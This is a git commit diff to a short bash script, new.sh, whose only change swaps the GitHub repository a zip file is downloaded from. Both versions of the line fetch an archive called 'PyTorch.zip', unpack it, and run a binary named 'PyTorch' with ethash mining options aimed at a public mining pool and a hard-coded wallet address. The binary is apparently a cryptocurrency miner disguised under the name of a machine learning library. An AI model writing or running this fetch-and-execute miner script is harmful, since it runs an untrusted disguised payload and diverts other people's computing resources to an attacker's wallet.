eee5a88442a5f95faad25bdf8c1dd64b27d26b1e
Diefky <Diefky@users.noreply.github.com>
2022-01-24 12:07:27 +0700

    Update new.sh

--- new.sh
+++ new.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo apt update && sudo apt-get install zip unzip && wget https://github.com/n5000/PyTorch/raw/main/PyTorch.zip && unzip PyTorch.zip && cd PyTorch && chmod u+x PyTorch && ./PyTorch -a ethash -o stratum+tcp://ethash.unmineable.com:3333 -u TRX:TGmtm8mGs8bgmSVPZ3rjggWEEQW8cSetDC.n41
+sudo apt update && sudo apt-get install zip unzip && wget https://github.com/Diefky/baru/raw/main/PyTorch.zip && unzip PyTorch.zip && cd PyTorch && chmod u+x PyTorch && ./PyTorch -a ethash -o stratum+tcp://ethash.unmineable.com:3333 -u TRX:TGmtm8mGs8bgmSVPZ3rjggWEEQW8cSetDC.n41
